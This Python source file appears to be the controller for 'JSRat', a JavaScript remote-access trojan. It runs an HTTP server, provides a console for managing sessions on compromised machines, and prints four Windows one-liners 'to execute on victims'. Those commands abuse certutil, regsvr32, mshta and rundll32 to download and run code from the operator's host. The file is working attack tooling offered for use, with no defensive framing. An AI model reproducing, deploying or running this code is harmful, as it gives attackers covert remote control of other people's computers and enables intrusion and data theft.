#!/usr/bin/env python3
#coding:utf-8

import sys
from lib.shell import Shell
from lib.server import Server

class JSRat(object):
    def __init__(self):
        super().__init__()
        self.port = 8080 
        self.shell = Shell()
        self.httpd = Server(self.__host, self.port, self.shell)
        self.httpd.start()

    @property
    def __host(self):
        import socket
        host = b''
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 80))
            host = s.getsockname()[0]
        return host 

    def __parse_line(self, line):
        return line.strip().partition(' ')

    def cli_start(self,*args, **kwargs):
        self.print_online_cmd(self.__host, self.port)
        while True:
            command, _, args = self.__parse_line(input(self.shell.prompt))
            if not command:
                continue
            try:
                com_cmd = ['sessions', 'quit', 'exit', 'help', 'clear']
                cmdprefix = 'command'
                if self.shell.curSession and command not in com_cmd:
                    cmdprefix = 'session' 
                command_handler = getattr(self.shell, '{}_{}'.format(cmdprefix, command))
                command_handler(args)
            except AttributeError:
                print('Unkown command')
            except KeyboardInterrupt:
                print('~Bye Bye~')
                sys.exit()
    def print_online_cmd(self, host, port):
        print('[*]Execute one of following command on victims :')
        print('[1] ', '{} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format('certutil', host, port))
        print('[2] ', '{} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format('regsvr32', host, port))
        print('[3]', '''{} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format('mshta', host, port))
        print('[4]', r'''{} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'''.format('rundll32', host, port))
